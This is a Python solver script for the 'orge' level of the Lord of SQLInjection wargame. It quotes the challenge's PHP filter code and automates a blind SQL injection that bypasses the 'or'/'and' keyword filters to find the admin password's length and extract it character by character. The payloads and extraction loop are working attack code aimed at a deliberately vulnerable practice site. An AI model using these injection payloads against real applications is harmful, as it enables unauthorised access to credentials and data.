#!/usr/bin/env python3
import los
import los_cookies as lc


def check_func(*args) -> bool:
    """
    check string in response of request
    args[0]: response
    """
    return 'Hello admin' in args[0]


def main():
    """
    Orge

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
    if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe");
    $query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>";

    $_GET[pw] = addslashes($_GET[pw]);
    $query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge");
    """

    url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'pw'

    payload = "'||length(pw)>%s&&id=0x61646d696e#"
    p = los.SqlInjection(url, cook, method, inj_param, payload)
    len_of_key = p.find_key_len(check_func)

    p.payload = f"'||id='admin'&&ascii(mid(pw,%d,1))<%s#"
    result = p.find_binary(check_func, len_of_key)

    p.payload = result
    response = p.my_request()

    if 'Clear!' in response:
        print('\nORGE Clear!')


if __name__ == '__main__':
    main()
